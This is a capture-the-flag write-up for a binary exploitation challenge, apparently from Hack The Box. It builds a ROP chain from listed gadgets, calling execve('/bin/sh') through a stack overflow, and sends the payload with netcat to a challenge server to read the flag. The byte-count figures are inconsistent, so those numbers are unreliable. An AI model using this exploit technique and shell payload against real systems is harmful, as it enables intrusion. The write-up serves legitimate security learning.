## klxsacre writeup

There's 110 bytes available for the payload. The variable starts at offset 0x30 from `RBP` so 48 + 8 (`RBP`) = 56.

174 (`0xae`) bytes is what `read` will accept.

174 - 56 = 118.
## ROP gadgets:

`402bd8 : pop rdi ; pop rbp ; ret`

`402bd6 : pop rsi ; pop r15 ; pop rbp ; ret`

`418eba : pop rdx ; ret 6` (This will return first and then adds 6 to the stack pointer `add rsp, 6`)

`42adab : pop rax ; ret`

`40141a : syscall`

Address of null-terminated "/bin/sh": `0x0000000000481779`
## Final payload:

`0x0000000000402bd8` => `rdi gadget address` + `0x0000000000481779` + `0x0000000000402bd6` => `rsi gadget address` + `0000000000000000` + `0000000000000000` + `0000000000000000` + `0x0000000000418eba` => `rdx gadget address` + `0000000000000000` + `000000000042adab` => `rax gadget address` + `AAAAAA` + `000000000000003b` + `000000000040141a`

```python
python3 -c "import sys; sys.stdout.buffer.write(
    b'1' +                                         
    b'\n'*30 +                                             
    b'1' +                                          
    b'\n'*30 +                                              
    b'y\n' +                                    
    b'A'*48 +                              # min size                              
    b'B'*8 +                               # accounting for rbp     

    b'\xd8\x2b\x40\x00\x00\x00\x00\x00' +  # pop rdi ; pop rbp ; ret
    b'\x78\x17\x48\x00\x00\x00\x00\x00' +  # rdi = '/bin/sh'
    b'\x00\x00\x00\x00\x00\x00\x00\x00' +  # rbp junk
                                                         
    b'\xd6\x2b\x40\x00\x00\x00\x00\x00' +  # pop rsi ; pop r15 ; pop rbp ; ret
    b'\x00\x00\x00\x00\x00\x00\x00\x00' +  # rsi = 0
    b'\x00\x00\x00\x00\x00\x00\x00\x00' +  # r15 junk
    b'\x00\x00\x00\x00\x00\x00\x00\x00' +  # rbp junk
                                                         
    b'\xba\x8e\x41\x00\x00\x00\x00\x00' +  # pop rdx ; ret 6
    b'\x00\x00\x00\x00\x00\x00\x00\x00' +  # rdx = 0
                                                                 
    b'\xab\xad\x42\x00\x00\x00\x00\x00' +  # pop rax ; ret
    b'AAAAAA' +                             # 6 junk bytes for ret 6
    b'\x3b\x00\x00\x00\x00\x00\x00\x00' +  # rax = 59 (execve)
    # by the time we get her,e rax = 0x3b; rdi => "/bin/sh"; rsi = 0; rdx = 0.                                              
    b'\x1a\x14\x40\x00\x00\x00\x00\x00'    # syscall
)" > pl.bin
```
## Solving the challenge:

`(cat pl.bin; cat) | nc 94.237.120.195 58183`
`cat flag.txt` (on the payload-spawned shell)

## Flag

`HTB{p0w3R_g41d_r34ct1on_3c47b...}`

## Notes:

* The `read_num` function reads 31 bytes from the input stream, so the panel option (`1`) needs to be padded with 30 whitespaces or line feeds before being sent.

* The same goes for the second panel.

* This doesn't happen when you are prompted a y/n option. In this case, only two bytes are read, which is why there's only `y\n` for the third prompt.

* There's 118 bytes available for the payload, out of which: 8 (`rdi gadget address`) + `8 (/bin/sh string)` + 8 (`padding for rbp in rdi gadget`) + 8 (`rsi gadget address`) + 8 (`rsi value, which is NULL`) + 16 (`padding for r15 and rbp in rsi gadget`) + 8 (`rdx gadget`) + 8 (`rdx value, which is NULL`) + 8 (`rax gadget`) + 6 (`padding for the ret 6 instruction in rdx gadget`) + 8 (`rax value, which is 0x3b, the syscall number for exec`) + 8 (`syscall gadget`) = 102 bytes are being used.


